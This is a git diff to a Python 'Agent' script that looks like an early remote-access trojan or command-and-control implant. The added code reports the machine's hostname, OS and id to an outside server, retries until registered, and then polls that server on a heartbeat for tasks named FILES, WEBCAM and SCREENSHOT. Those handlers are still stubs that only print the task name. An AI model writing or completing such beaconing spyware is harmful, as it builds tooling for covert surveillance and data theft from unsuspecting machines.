@@ -30,16 +30,66 @@ class Agent():
         
         except ValueError as e:
             print(f"[-] FATAL ERROR: {e}")
-        
-        
+     
+me = Agent()
+       
+    
 def handle_task(tsk):
     pass
  
 def connect(url):
-    id, name, os =  me.id, socket.gethostname(), platform.system()
-    res = requests.post(url+"/info", json={"id" : id, "os" : os, "name" : name}, timeout=5)
-    while res.text != "OK":
-        res = requests.post(url+"/info", json={"id" : id, "os" : os, "name" : name}, timeout=5)
+    agent_id = me.id
+    name = socket.gethostname()
+    os_name = platform.system()
+
+    while True:
+        try:
+            res = requests.post(
+                url + "/info",
+                json={
+                    "id": agent_id,
+                    "os": os_name,
+                    "name": name
+                },
+                timeout=5
+            )
+
+            if res.status_code == 200:
+                print("[+] Connected to server")
+                return True
+
+            print(f"[-] Server returned status: {res.status_code}")
+
+        except requests.exceptions.ConnectionError:
+            print("[-] Cannot connect to server")
+
+        except requests.exceptions.Timeout:
+            print("[-] Server timeout")
+
+        time.sleep(3)
+
+def task_check(url):
+    try:
+        res = requests.post(url+"/tasks", json={"id" : me.id}, timeout=5)
+        data = res.json()
+        task = data.get("task")
+        if task == "NONE": return False
+        elif task == "FILES": print("FILES")
+        elif task == "WEBCAM": print("WEBCAM")
+        elif task == "SCREENSHOT": print("SCREENSHOT")
+        
+    except requests.exceptions.ConnectionError:
+        print("[-] Cannot connect to server")
+        return False
+
+    except requests.exceptions.Timeout:
+        print("[-] Server timeout")
+        return False
+
+    except Exception as e:
+        print(f"[-] Task check failed: {e}")
+        return False
+    
     
     
         
@@ -47,30 +97,9 @@ def active_loop(pointurl, agentID, heartbeat):
     connect(pointurl)
     
     while True:
-        try:
-            response = requests.post(pointurl, json={"agent_id" : agentID}, timeout=5)
-            if response.status_code == 200:
-                data = response.json()
-                
-                if data.get("task"):
-                    task = data.get("task")
-                    print(f"[+] Task received: {task}")
-                    handle_task(task)
-                    
-                    
-            
-        except requests.exceptions.ConnectionError:
-            print("[-] Cannot connect to server")
-
-        except requests.exceptions.Timeout:
-            print("[-] Server timeout")
-
-        except Exception as e:
-            print(f"[-] Unexpected error: {e}")
-        
+        task_check(pointurl)
         time.sleep(heartbeat)
     
 
-me = Agent()
-    
+
 active_loop(me.pointurl, me.id, me.heartbeat)
